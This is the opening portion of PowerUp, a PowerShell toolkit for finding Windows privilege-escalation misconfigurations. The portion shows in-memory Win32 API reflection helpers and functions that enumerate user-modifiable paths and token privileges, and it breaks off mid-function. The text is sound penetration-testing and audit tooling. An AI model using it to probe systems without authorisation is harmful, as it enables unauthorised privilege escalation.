<#

PowerUp aims to be a clearinghouse of common Windows privilege escalation
vectors that rely on misconfigurations. See README.md for more information.

Author: @harmj0y
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

#>

#Requires -Version 2


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# PowerUp Helpers
#
########################################################

function Get-ModifiablePath {
<#
.SYNOPSIS

Parses a passed string containing multiple possible file/folder paths and returns
the file paths where the current user has modification rights.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Takes a complex path specification of an initial file/folder path with possible
configuration files, 'tokenizes' the string in a number of possible ways, and
enumerates the ACLs for each path that currently exists on the system. Any path that
the current user has modification rights on is returned in a custom object that contains
the modifiable path, associated permission set, and the IdentityReference with the specified
rights. The SID of the current user and any group he/she are a part of are used as the
comparison set against the parsed path DACLs.

.PARAMETER Path

The string path to parse for modifiable files. Required

.PARAMETER Literal

Switch. Treat all paths as literal (i.e. don't do 'tokenization').

.EXAMPLE

'"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath

Path                       Permissions                IdentityReference
----                       -----------                -----------------
C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...

.EXAMPLE

Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath

Path                       Permissions                IdentityReference
----                       -----------                -----------------
C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
...

.OUTPUTS

PowerUp.TokenPrivilege.ModifiablePath

Custom PSObject containing the Permissions, ModifiablePath, IdentityReference for
a modifiable path.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Alias('LiteralPaths')]
        [Switch]
        $Literal
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if ($PSBoundParameters['Literal']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
                    if ($ParentPath -and (Test-Path -Path $ParentPath)) {
                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if (($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if ($TempPath -and ($TempPath -ne '')) {
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }

                    # the set of permission types that allow for modification
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if ($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if (-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                # translate the IdentityReference if it's a username and not a SID
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if ($CurrentUserSids -contains $IdentitySID) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $Permissions
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            $Out
                        }
                    }
                }
            }
        }
    }
}


function Get-TokenInformation {
<#
.SYNOPSIS

Helpers that returns token groups or privileges for a passed process/thread token.
Used by Get-ProcessTokenGroup and Get-ProcessTokenPrivilege.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

Wraps the GetTokenInformation() Win 32API call to query the given token for
either token groups (-InformationClass "Groups") or privileges (-InformationClass "Privileges").
For token groups, group is iterated through and the SID structure is converted to a readable
string using ConvertSidToStringSid(), and the unique list of SIDs the user is a part of
(disabled or not) is returned as a string array.

.PARAMETER TokenHandle

The IntPtr token handle to query. Required.

.PARAMETER InformationClass

The type of information to query for the token handle, either 'Groups', 'Privileges', or 'Type'.

.OUTPUTS

PowerUp.TokenGroup

Outputs a custom object containing the token group (SID/attributes) for the specified token if
"-InformationClass 'Groups'" is passed.

PowerUp.TokenPrivilege

Outputs a custom object containing the token privilege (name/attributes) for the specified token if
"-InformationClass 'Privileges'" is passed

PowerUp.TokenType

Outputs a custom object containing the token type and impersonation level for the specified token if
"-InformationClass 'Type'" is passed

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379624(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379626(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379630(v=vs.85).aspx
#>

    [OutputType('PowerUp.TokenGroup')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Alias('hToken', 'Token')]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $TokenHandle,

        [String[]]
        [ValidateSet('Groups', 'Privileges', 'Type')]
        $InformationClass = 'Privileges'
    )

    PROCESS {
        if ($InformationClass -eq 'Groups') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 2 enum to retrieve a TOKEN_GROUPS structure

            # initial query to determine the necessary buffer size
            $TokenGroupsPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
            [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
                For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                    # convert each token group SID to a displayable string

                    if ($TokenGroups.Groups[$i].SID) {
                        $SidString = ''
                        $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($Result -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $GroupSid = New-Object PSObject
                            $GroupSid | Add-Member Noteproperty 'SID' $SidString
                            # cast the atttributes field as our SidAttributes enum
                            $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                            $GroupSid | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                            $GroupSid.PSObject.TypeNames.Insert(0, 'PowerUp.TokenGroup')
                            $GroupSid
                        }
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
        }
        elseif ($InformationClass -eq 'Privileges') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 3 enum to retrieve a TOKEN_PRIVILEGES structure

            # initial query to determine the necessary buffer size
            $TokenPrivilegesPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, 0, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
